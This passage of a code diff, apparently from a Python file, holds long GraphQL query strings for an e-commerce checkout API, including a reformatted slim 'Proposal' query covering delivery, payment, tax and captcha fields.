__typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}"""
 
-QUERY_PROPOSAL_SLIM = """query Proposal($sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$changesetTokens:[String!],$alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens){__typename result{__typename ...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{__typename runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}delivery{__typename ...on FilledDeliveryTerms{deliveryLines{__typename selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}targetMerchandise{__typename linesV2{...on MerchandiseLine{stableId merchandise{...on ProductVariantMerchandise{requiresShipping __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}deliveryExpectations{__typename ...on FilledDeliveryExpectationTerms{deliveryExpectations{deliveryStrategyHandle signedHandle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{__typename ...on FilledPaymentTerms{availablePaymentLines{__typename paymentMethod{...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{__typename ...on FilledTaxTerms{totalTaxAmountV2{amount currencyCode __typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}__typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}}errors{code localizedMessage nonLocalizedMessage __typename}}__typename}}"""
+# ── SLIM documents ──────────────────────────────────────────────────────────
+QUERY_PROPOSAL_SLIM = """query Proposal($sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$changesetTokens:[String!],$alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput) {
+  session(sessionInput:$sessionInput) {
+    negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}) {
+      __typename
+      result {
+        __typename
+        ... on NegotiationResultAvailable {
+          checkpointData
+          queueToken
+          sellerProposal {
+            __typename
+            isShippingRequired
+            runningTotal { ... on MoneyValueConstraint { value { amount currencyCode } } }
+            total { ... on MoneyValueConstraint { value { amount currencyCode } } }
+            checkoutTotal { ... on MoneyValueConstraint { value { amount currencyCode } } }
+            tax {
+              __typename
+              ... on FilledTaxTerms { totalTaxAmount { ... on MoneyValueConstraint { value { amount currencyCode } } } }
+              ... on PendingTerms { pollDelay }
+              ... on UnavailableTerms { __typename }
+            }
+            delivery {
+              __typename
+              ... on FilledDeliveryTerms {
+                deliveryLines {
+                  selectedDeliveryStrategy { ... on CompleteDeliveryStrategy { handle } ... on DeliveryStrategyReference { handle } }
+                  availableDeliveryStrategies { ... on CompleteDeliveryStrategy { handle amount { ... on MoneyValueConstraint { value { amount currencyCode } } } } }
+                }
+              }
+              ... on PendingTerms { pollDelay taskId }
+              ... on UnavailableTerms { __typename }
+            }
+            deliveryExpectations {
+              __typename
+              ... on FilledDeliveryExpectationTerms { deliveryExpectations { deliveryStrategyHandle signedHandle } }
+              ... on PendingTerms { pollDelay taskId }
+              ... on UnavailableTerms { __typename }
+            }
+            payment {
+              __typename
+              ... on FilledPaymentTerms { availablePaymentLines { paymentMethod { ... on PaymentProvider { paymentMethodIdentifier name extensibilityDisplayName } } } }
+              ... on PendingTerms { pollDelay }
+              ... on UnavailableTerms { __typename }
+            }
+            nonNegotiableTerms { signature contents { signature targetTerms targetLine { allLines index } attributes } }
+            scriptFingerprint { signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges }
+            transformerFingerprintV2
+            captcha { __typename ... on Captcha { provider challenge sitekey token } }
+          }
+        }
+        ... on CheckpointDenied { redirectUrl }
+        ... on Throttled { pollAfter queueToken pollUrl }
+        ... on NegotiationResultFailed { __typename }
+      }
+      errors { code localizedMessage nonLocalizedMessage }
+      __typename
+    }
+    __typename
+  }
+}"""
 
